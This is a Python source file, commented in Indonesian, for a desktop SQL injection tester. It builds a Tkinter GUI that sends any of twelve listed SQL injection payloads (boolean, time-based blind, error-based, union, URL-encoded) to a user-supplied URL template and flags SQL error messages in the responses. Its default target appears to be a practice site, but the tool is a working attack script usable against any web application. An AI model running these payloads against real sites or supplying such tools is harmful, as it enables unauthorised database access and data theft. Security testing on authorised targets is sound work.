import tkinter as tk
from tkinter import scrolledtext, messagebox, ttk # ttk for Combobox
import requests
import re
import time

# --- Daftar Payload SQL Injection ---
# Ini adalah daftar payload umum yang bisa Anda gunakan.
# Anda bisa menambahkan lebih banyak sesuai kebutuhan.
SQLI_PAYLOADS = [
    "1' OR '1'='1-- -",                 # Basic error-based / boolean-based (MySQL)
    "1\" OR \"1\"=\"1-- -",             # Basic error-based / boolean-based (double quote)
    "1' OR 1=1 LIMIT 1-- -",            # Basic with LIMIT
    "1' AND SLEEP(5)-- -",              # Time-based blind (MySQL)
    "1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -", # Time-based blind (Oracle)
    "1' AND 1=CAST((SELECT @@version) AS INT)-- -", # Error-based (SQL Server)
    "1' UNION SELECT 1,2,3-- -",        # Union-based (contoh dasar)
    "1' AND 'a'='a",                    # Boolean true
    "1' AND 'a'='b",                    # Boolean false
    "1' HAVING 1=1-- -",                # Using HAVING clause
    "1%27%20OR%20%271%27%3D%271",       # URL-encoded ' OR '1'='1
    "1' OR 1=1#",                       # Basic with hash comment (MySQL)
]


def test_sql_injection_gui(target_url_template, payload, result_text_widget):
    """
    Mengirimkan payload SQLi ke URL template dan menampilkan hasilnya di GUI.
    """
    if not target_url_template or not payload:
        messagebox.showwarning("Input Kosong", "URL Template dan Payload tidak boleh kosong.")
        return

    # Bersihkan hasil sebelumnya
    result_text_widget.delete(1.0, tk.END)
    result_text_widget.insert(tk.END, f"--- Memulai Uji Payload: {payload} ---\n\n")
    result_text_widget.see(tk.END)

    # Ganti placeholder {payload} di URL template dengan payload yang sebenarnya
    if "{payload}" not in target_url_template:
        messagebox.showerror("Format URL Salah", "URL Template harus mengandung '{payload}' sebagai placeholder.")
        result_text_widget.insert(tk.END, "Pengujian dibatalkan karena format URL salah.\n")
        return

    test_url = target_url_template.replace("{payload}", payload)
    
    start_time = time.time()
    try:
        response = requests.get(test_url, timeout=10) # Timeout 10 detik
        end_time = time.time()
        elapsed_time = round(end_time - start_time, 2) # Waktu respons

        result_text_widget.insert(tk.END, f"URL yang Diuji: {test_url}\n")
        result_text_widget.insert(tk.END, f"Status Code: {response.status_code}\n")
        result_text_widget.insert(tk.END, f"Panjang Respons: {len(response.text)} karakter\n")
        result_text_widget.insert(tk.END, f"Waktu Respons: {elapsed_time} detik\n\n")

        # Deteksi pesan kesalahan SQL umum
        sql_error_patterns = [
            r"You have an error in your SQL syntax",
            r"SQLSTATE",
            r"mysql_fetch_array()",
            r"Warning: mysql_num_rows()",
            r"ORA-\d{5}", # Oracle errors
            r"Unclosed quotation mark after the character string", # SQL Server
            r"Pg error", # PostgreSQL
            r"ODBC SQLSTATE",
        ]

        error_found = False
        for pattern in sql_error_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                result_text_widget.insert(tk.END, f"[! POTENSIAL KERENTANAAN !] Ditemukan pesan error SQL: '{pattern}'\n\n")
                error_found = True
                break
        
        if not error_found:
            result_text_widget.insert(tk.END, "Tidak ada pesan error SQL umum terdeteksi.\n\n")

        result_text_widget.insert(tk.END, "--- Awal Respons HTTP ---\n")
        result_text_widget.insert(tk.END, response.text[:1500] + "...\n" if len(response.text) > 1500 else response.text + "\n") # Tampilkan sebagian besar respons
        result_text_widget.insert(tk.END, "\n--- Akhir Respons HTTP ---\n")

    except requests.exceptions.RequestException as e:
        result_text_widget.insert(tk.END, f"Terjadi kesalahan saat membuat permintaan: {e}\n")
    finally:
        result_text_widget.see(tk.END) # Scroll ke bawah
        result_text_widget.insert(tk.END, "\n--- Uji Selesai ---\n")
        result_text_widget.see(tk.END)


def set_payload_from_list(payload_entry_widget, payload_var):
    """
    Mengatur payload_entry_widget dengan payload yang dipilih dari Combobox.
    """
    selected_payload = payload_var.get()
    payload_entry_widget.delete(0, tk.END)
    payload_entry_widget.insert(0, selected_payload)

def create_sql_injection_gui():
    """
    Fungsi untuk membuat dan menjalankan GUI utama alat SQL Injection.
    """
    root = tk.Tk()
    root.title("SQL Injection Tester (Sederhana)")
    root.geometry("800x650") # Ukuran jendela

    # Frame untuk input
    input_frame = tk.Frame(root, padx=10, pady=10)
    input_frame.pack(pady=5, fill=tk.X)

    tk.Label(input_frame, text="URL Template (gunakan '{payload}' sebagai placeholder):").grid(row=0, column=0, sticky=tk.W, pady=2)
    url_entry = tk.Entry(input_frame, width=80)
    url_entry.grid(row=0, column=1, columnspan=2, pady=2) # Spanning 2 columns
    url_entry.insert(0, "http://testphp.vulnweb.com/listproducts.php?cat={payload}") 

    tk.Label(input_frame, text="Payload SQL Injection:").grid(row=1, column=0, sticky=tk.W, pady=2)
    payload_entry = tk.Entry(input_frame, width=80)
    payload_entry.grid(row=1, column=1, pady=2)
    payload_entry.insert(0, "1' OR '1'='1-- -") # Contoh payload dasar

    # --- Bagian Baru: Dropdown dan Tombol Change Payload ---
    payload_selection_var = tk.StringVar(root) # Variabel untuk menyimpan pilihan dari dropdown
    payload_selection_var.set(SQLI_PAYLOADS[0]) # Set nilai default

    payload_selector_label = tk.Label(input_frame, text="Pilih Payload:")
    payload_selector_label.grid(row=2, column=0, sticky=tk.W, pady=2)

    payload_selector_combobox = ttk.Combobox(input_frame, textvariable=payload_selection_var, values=SQLI_PAYLOADS, width=77)
    payload_selector_combobox.grid(row=2, column=1, pady=2)
    payload_selector_combobox.bind("<<ComboboxSelected>>", lambda event: set_payload_from_list(payload_entry, payload_selection_var))
    # Tombol "Ganti Payload" (sekarang bisa opsional, karena combobox juga bisa langsung mengganti)
    # change_payload_button = tk.Button(input_frame, text="Ganti Payload",
    #                                  command=lambda: set_payload_from_list(payload_entry, payload_selection_var))
    # change_payload_button.grid(row=2, column=2, padx=5, pady=2) # Masukkan di kolom 2

    # --- End Bagian Baru ---


    # Tombol untuk menjalankan pengujian
    test_button = tk.Button(input_frame, text="Uji Payload", 
                            command=lambda: test_sql_injection_gui(url_entry.get(), payload_entry.get(), result_text))
    test_button.grid(row=3, column=0, columnspan=2, pady=10) # Sesuaikan baris karena ada tambahan widget

    # Frame untuk hasil
    result_frame = tk.Frame(root, padx=10, pady=5)
    result_frame.pack(expand=True, fill=tk.BOTH)

    tk.Label(result_frame, text="Hasil Respons:").pack(anchor=tk.W)
    result_text = scrolledtext.ScrolledText(result_frame, wrap=tk.WORD, width=90, height=25, font=("Courier New", 9))
    result_text.pack(expand=True, fill=tk.BOTH)

    root.mainloop()

if __name__ == "__main__":
    create_sql_injection_gui()